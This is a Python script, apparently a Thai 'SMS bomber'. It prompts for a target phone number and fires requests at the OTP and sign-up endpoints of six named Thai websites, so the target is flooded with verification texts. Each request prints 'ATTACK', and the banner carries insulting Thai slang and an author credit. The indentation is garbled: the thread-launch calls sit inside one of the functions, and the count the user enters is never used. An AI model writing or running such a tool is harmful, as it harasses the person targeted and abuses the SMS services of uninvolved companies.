import requests,json
import random
import os
import time
import threading
from requests import get
from re import search
from requests import Session
from threading import Thread
os.system('clear')
print("เครดิต:Skl Yui ")
print("ยิงพ่อมึงแปปนึ่ง ")

print("         \033[1;93m[ \033[1;3m\033[1;91mFacebook Skl Yui : \033[1;95mMonifire Skl Yui \033[1;93m]")
print("")
phone = input("\033[1;3m\033[1;91m» \033[1;96mPHONE-ใส่เบอร์ควายรอไร : \033[1;92m")
jam = int(input("\033[1;3m\033[1;91m» \033[1;96mNUBER-ยิงพ่อมึงแปปนึ่ง : \033[1;92m"))
print("")

def api1():
	requests.post("https://m.thisshop.com/cos/send/code/notice", json={"sessionContext":{"channel":"h5","entityCode":0,"userReferenceNumber":"12w12y11r52gz259ue14rr7g7370239m","localDateTimeText":"20220115182850","riskMessage":"{}","serviceCode":"FLEX0001","superUserId":"sysadmin","tokenKey":"149d5c7bae10304c8aba0da2bbc59cb7","authorizationReason":"","transactionBranch":"TFT_ORG_0000","userId":"","locale":"th-TH"},"noticeType":1,"businessType":"RT0001","phoneNumber":f"66-{phone}"},headers={"content-type": "application/json; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
	
def api2():
	headers = {
	    "content-type": "application/x-www-form-urlencoded",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "referer": "https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone",
	    "cookie": "_gcl_au=1.1.1123274548.1637746846"
	    }
	requests.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",headers=headers,data=f"phoneno={phone}&retrycount=0")
	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
	
def api3():
	requests.post("https://gettgo.com/sessions/otp_for_sign_up", data={"mobile_number":phone})
	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
	
def api4():
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
	
def api5():
	requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
	
def api6():
	requests.post("http://b226.com/x/code", data={f"phone":phone})
	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
	
	threading.Thread(target=api1).start()
	threading.Thread(target=api2).start()
	threading.Thread(target=api3).start()
	threading.Thread(target=api4).start()
	threading.Thread(target=api5).start()
	threading.Thread(target=api6).start()
	
	